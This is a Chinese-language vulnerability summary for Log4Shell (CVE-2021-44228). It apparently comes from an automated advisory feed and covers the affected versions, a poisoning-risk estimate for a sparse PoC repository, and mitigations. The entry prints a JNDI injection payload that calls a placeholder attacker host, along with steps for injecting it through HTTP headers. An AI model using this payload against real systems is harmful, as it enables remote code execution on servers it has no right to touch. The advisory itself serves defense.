## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)